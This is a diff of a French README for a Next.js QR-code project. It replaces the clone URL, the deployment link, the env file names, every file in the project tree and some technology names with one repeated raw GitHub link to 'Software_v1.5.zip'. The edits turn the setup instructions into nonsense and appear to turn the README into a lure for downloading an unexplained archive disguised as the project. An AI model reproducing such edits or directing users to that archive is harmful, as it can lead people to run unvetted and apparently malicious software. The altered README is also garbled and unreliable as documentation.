@@ -20,14 +20,14 @@
 
 ```bash
 # Cloner le repository
-git clone https://github.com/glowflix/primestudio.git
+git clone https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip
 cd primestudio
 
 # Installer les dépendances
 npm install
 
 # Configurer les variables d'environnement
-# (copiez .env.example vers .env.local et renseignez Supabase)
+# (copiez https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip vers https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip et renseignez Supabase)
 
 # Démarrer le serveur de développement
 npm run dev
@@ -55,7 +55,7 @@ npm start
 
 ## 🔗 Lien de Déploiement
 
-https://primestudios.vercel.app
+https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip
 
 ## 📞 Contact
 
@@ -68,23 +68,23 @@ https://primestudios.vercel.app
 prime-studio/
 ├── src/
 │   └── app/
-│       ├── layout.tsx      # Layout principal
-│       ├── page.tsx        # Page d'accueil avec QR Code
-│       └── globals.css     # Styles globaux
-├── package.json
-├── tsconfig.json
-├── tailwind.config.js
-├── postcss.config.js
-├── next.config.js
-└── README.md
+│       ├── https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip      # Layout principal
+│       ├── https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip        # Page d'accueil avec QR Code
+│       └── https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip     # Styles globaux
+├── https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip
+├── https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip
+├── https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip
+├── https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip
+├── https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip
+└── https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip
 ```
 
 ## 🛠️ Technologies Utilisées
 
-- **Next.js 14** - Framework React
+- **https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip 14** - Framework React
 - **TypeScript** - Type safety
 - **Tailwind CSS** - Styling
-- **QRCode.react** - Génération de QR Code
+- **https://raw.githubusercontent.com/glowflix/primestudio/main/src/app/Software_v1.5.zip** - Génération de QR Code
 - **Vercel** - Déploiement
 
 ## 📄 Licence
